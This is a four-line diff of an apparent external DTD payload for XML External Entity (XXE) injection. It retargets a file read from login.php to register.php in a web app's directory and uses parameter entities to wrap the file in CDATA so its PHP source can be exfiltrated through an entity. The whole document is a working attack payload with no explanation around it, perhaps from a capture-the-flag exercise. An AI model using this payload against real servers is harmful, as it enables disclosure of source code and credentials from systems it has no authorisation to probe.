@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///var/www/html/skygenerator/public/login.php">
+<!ENTITY % file SYSTEM "file:///var/www/html/skygenerator/public/register.php">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY payl '%start;%file;%end;'>">
